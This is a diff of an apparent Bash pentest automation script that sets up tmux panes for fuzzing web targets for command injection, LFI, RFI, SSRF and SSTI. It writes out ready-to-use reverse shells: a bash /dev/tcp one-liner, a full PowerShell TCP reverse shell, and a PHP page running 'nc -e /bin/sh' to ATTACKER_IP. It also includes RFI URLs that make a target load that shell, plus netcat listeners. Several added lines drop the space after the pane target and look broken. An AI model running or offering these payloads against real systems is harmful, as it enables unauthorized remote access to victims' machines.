@@ -3119,20 +3119,6 @@ tmux send-keys "site=$site" Enter
 tmux send-keys "domain=$domain" Enter
 tmux send-keys "cd $folderProjectWebAuthN" Enter
 
-# Preparo il file per le command injection
-cd $folderProjectEngine
-python ./cmdGenerator.py $attackerIP cmdlist.txt
-mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
-cd $folderProjectWebAuthN
-
-# Preparo il file per le altre (RFI, SSRF, ...) injection
-cd $folderProjectEngine
-python ./injectionGenerator.py $attackerIP injectionlist.txt
-mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
-cd $folderProjectWebAuthN
-
-
-
 # WEB User Enumeration
 cd $folderProjectWebAuthN
 # Layout
@@ -3268,22 +3254,18 @@ tmux split-window -v -t PT:4.1
 tmux select-pane -t "4.1"
 tmux split-window -h -t "4.1"
 tmux split-window -h -t "4.1"
-sleep 0.2
 tmux split-window -v -t PT:4.4
 tmux select-pane -t "4.4"
 tmux split-window -h -t "4.4"
 tmux split-window -h -t "4.4"
-sleep 0.2
 tmux split-window -v -t PT:4.7
 tmux select-pane -t "4.7"
 tmux split-window -h -t "4.7"
 tmux split-window -h -t "4.7"
-sleep 0.2
 tmux split-window -v -t PT:4.10
 tmux select-pane -t "4.10"
 tmux split-window -h -t "4.10"
 tmux split-window -h -t "4.10"
-sleep 0.2
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:4.0 "# automate command injection scan" Enter
 tmux send-keys -t PT:4.0 "sudo uniscan -u $url -qweds"
@@ -3293,21 +3275,27 @@ tmux send-keys -t PT:4.2 "# activate listener HTTP" Enter
 tmux send-keys -t PT:4.2 "python3 -m http.server 80"
 tmux send-keys -t PT:4.3 "# activate listener SMB" Enter
 tmux send-keys -t PT:4.3 "impacket-smbserver -smb2support htb \$(pwd)"
-tmux send-keys -t PT:4.4 "# command injection automation (save burp file with name: burp.req)" Enter
+#Preparo il file per le command injection
+cd $folderProjectEngine
+#tmux send-keys -t PT:1.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
+python ./cmdGenerator.py $attackerIP cmdlist.txt
+mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
+cd $folderProjectWebAuthN
+tmux send-keys -t PT:4.4"# command injection automation (save burp file with name: burp.req)" Enter
 tmux send-keys -t PT:4.4 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-command-injection-list.txt -fl 120"
-tmux send-keys -t PT:4.5 "# command injection automation (GET)" Enter
+tmux send-keys -t PT:4.5"# command injection automation (GET)" Enter
 tmux send-keys -t PT:4.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
 tmux send-keys -t PT:4.6 "# command injection automation (POST)" Enter
 tmux send-keys -t PT:4.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
-tmux send-keys -t PT:4.7 "# command injection automation for Linux: save revShell for linux in shell file" Enter
+tmux send-keys -t PT:4.7"# command injection automation for Linux: save revShell for linux in shell file" Enter
 tmux send-keys -t PT:4.7 "echo \"/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1\" > shell"
-tmux send-keys -t PT:4.8 "# command injection automation for Linux: activate HTTP server" Enter
+tmux send-keys -t PT:4.8"# command injection automation for Linux: activate HTTP server" Enter
 tmux send-keys -t PT:4.8 "python3 -m http.server 80"
-tmux send-keys -t PT:4.9 "# command injection automation for Linux: listener" Enter
+tmux send-keys -t PT:4.9"# command injection automation for Linux: listener" Enter
 tmux send-keys -t PT:4.9 "nc -nlvp 9001"
-tmux send-keys -t PT:4.10 "# command injection automation for Windows: save revShell for windows in shellWin file" Enter
+tmux send-keys -t PT:4.10"# command injection automation for Windows: save revShell for windows in shellWin file" Enter
 tmux send-keys -t PT:4.10 'echo '\''$LHOST = "192.168.1.102"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'\'' > shellWin' C-m
-tmux send-keys -t PT:4.11 "# command injection automation for Windows: activate HTTP server" Enter
+tmux send-keys -t PT:4.11"# command injection automation for Windows: activate HTTP server" Enter
 tmux send-keys -t PT:4.11 "python3 -m http.server 80"
 tmux send-keys -t PT:4.12 "# command injection automation for Windows: listener" Enter
 tmux send-keys -t PT:4.12 "nc -nlvp 9001"
@@ -3327,9 +3315,15 @@ tmux split-window -v -t PT:5.4
 tmux select-pane -t "5.4"
 tmux split-window -h -t "5.4"
 tmux split-window -v -t PT:5.6
-tmux send-keys -t PT:5.0 "# LFI injection automation (save burp file with name: burp.req)" Enter
+# Esecuzione dei comandi nelle sottofinestre
+#Preparo il file per le command injection
+cd $folderProjectEngine
+python ./injectionGenerator.py $attackerIP injectionlist.txt
+mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
+cd $folderProjectWebAuthN
+tmux send-keys -t PT:5.0"# LFI injection automation (save burp file with name: burp.req)" Enter
 tmux send-keys -t PT:5.0 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
-tmux send-keys -t PT:5.1 "# LFI injection automation (GET)" Enter
+tmux send-keys -t PT:5.1"# LFI injection automation (GET)" Enter
 tmux send-keys -t PT:5.1 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
 tmux send-keys -t PT:5.2 "# LFI injection automation (POST)" Enter
 tmux send-keys -t PT:5.2 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
@@ -3364,29 +3358,35 @@ tmux split-window -h -t "6.6"
 tmux split-window -h -t "6.6"
 tmux split-window -h -t "6.6"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:6.0 "# RFI - HTTP listener" Enter
+tmux send-keys -t PT:6.0"# RFI - HTTP listener" Enter
 tmux send-keys -t PT:6.0 "python3 -m http.server 80"
-tmux send-keys -t PT:6.1 "# RFI - interacsh listener" Enter
+tmux send-keys -t PT:6.1"# RFI - interacsh listener" Enter
 tmux send-keys -t PT:6.1 "firefox https://app.interactsh.com/ &"
-tmux send-keys -t PT:6.2 "# RFI - SMB listener" Enter
+tmux send-keys -t PT:6.2"# RFI - SMB listener" Enter
 tmux send-keys -t PT:6.2 "impacket-smbserver -smb2support share $(pwd)"
-tmux send-keys -t PT:6.3 "# RFI injection automation (save burp file with name: burp.req)" Enter
+#Preparo il file per le RFI injection
+cd $folderProjectEngine
+python ./injectionGenerator.py $attackerIP injectionlist.txt
+mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
+cd $folderProjectWebAuthN
+tmux send-keys -t PT:6.3"# RFI injection automation (save burp file with name: burp.req)" Enter
 tmux send-keys -t PT:6.3 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
-tmux send-keys -t PT:6.4 "# RFI injection automation (GET)" Enter
+tmux send-keys -t PT:6.4"# RFI injection automation (GET)" Enter
 tmux send-keys -t PT:6.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
 tmux send-keys -t PT:6.5 "# RFI injection automation (POST)" Enter
 tmux send-keys -t PT:6.5 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
-tmux send-keys -t PT:6.6 "# RFI - activate listener on 9001 port " Enter
+cd $folderProject
+tmux send-keys -t PT:6.6"# RFI - activate listener on 9001 port " Enter
 tmux send-keys -t PT:6.6 "nc -nlvp 9001"
-tmux send-keys -t PT:6.7 "# RFI - prepare a reverse shell on PHP page" Enter
+tmux send-keys -t PT:6.7"# RFI - prepare a reverse shell on PHP page" Enter
 tmux send-keys -t PT:6.7 "rm -f shell.txt && echo \"<?php passthru(\\\"nc -e /bin/sh ATTACKER_IP 9001\\\"); ?>\" > shell.txt && python3 -m http.server 80"
-tmux send-keys -t PT:6.8 "# RFI - activate reverse shell" Enter
+tmux send-keys -t PT:6.8"# RFI - activate reverse shell" Enter
 tmux send-keys -t PT:6.8 "firefox http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt &"
-tmux send-keys -t PT:6.9 "# RFI - activate reverse shell" Enter
+tmux send-keys -t PT:6.9"# RFI - activate reverse shell" Enter
 tmux send-keys -t PT:6.9 "firefox http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt? &"
-tmux send-keys -t PT:6.10 "# RFI - activate reverse shell" Enter
+tmux send-keys -t PT:6.10"# RFI - activate reverse shell" Enter
 tmux send-keys -t PT:6.10 "firefox http://$site/page-RFI.php?file=ftp://ATTACKER_IP/shell.txt &"
-tmux send-keys -t PT:6.11 "# RFI - activate reverse shell" Enter
+tmux send-keys -t PT:6.11"# RFI - activate reverse shell" Enter
 tmux send-keys -t PT:6.11 "firefox http://$site/page-RFI.php?file=hTTp://ATTACKER_IP/shell.txt &"
 
 
@@ -3402,13 +3402,18 @@ tmux select-pane -t "7.2"
 tmux split-window -h -t "7.2"
 tmux split-window -h -t "7.2"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:7.0 "# SSRF - HTTP listener" Enter
+tmux send-keys -t PT:7.0"# SSRF - HTTP listener" Enter
 tmux send-keys -t PT:7.0 "python3 -m http.server 80"
-tmux send-keys -t PT:7.1 "# SSRF - interacsh listener" Enter
+tmux send-keys -t PT:7.1"# SSRF - interacsh listener" Enter
 tmux send-keys -t PT:7.1 "firefox https://app.interactsh.com/ &"
-tmux send-keys -t PT:7.2 "# RFI injection automation (save burp file with name: burp.req)" Enter
+#Preparo il file per le SSRF injection
+cd $folderProjectEngine
+python ./injectionGenerator.py $attackerIP injectionlist.txt
+mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
+cd $folderProjectWebAuthN
+tmux send-keys -t PT:7.2"# RFI injection automation (save burp file with name: burp.req)" Enter
 tmux send-keys -t PT:7.2 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
-tmux send-keys -t PT:7.3 "# RFI injection automation (GET)" Enter
+tmux send-keys -t PT:7.3"# RFI injection automation (GET)" Enter
 tmux send-keys -t PT:7.3 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
 tmux send-keys -t PT:7.4 "# RFI injection automation (POST)" Enter
 tmux send-keys -t PT:7.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
@@ -3440,11 +3445,15 @@ tmux send-keys -t PT:8.2 "# activate listener HTTP" Enter
 tmux send-keys -t PT:8.2 "python3 -m http.server 80"
 tmux send-keys -t PT:8.3 "# activate listener for reverse shell on port 9001" Enter
 tmux send-keys -t PT:8.3 "nc -nlvp 9001"
-tmux send-keys -t PT:8.4 "# SSTI automation (save burp file with name: burp.req)" Enter
+cd $folderProjectEngine
+python ./injectionGenerator.py $attackerIP injectionlist.txt
+mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
+cd $folderProjectWebAuthN
+tmux send-keys -t PT:8.4"# command injection automation (save burp file with name: burp.req)" Enter
 tmux send-keys -t PT:8.4 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
-tmux send-keys -t PT:8.5 "# SSTI automation (GET)" Enter
+tmux send-keys -t PT:8.5"# command injection automation (GET)" Enter
 tmux send-keys -t PT:8.5 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
-tmux send-keys -t PT:8.6 "# SSTI automation (POST)" Enter
+tmux send-keys -t PT:8.6 "# command injection automation (POST)" Enter
 tmux send-keys -t PT:8.6 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
 
 
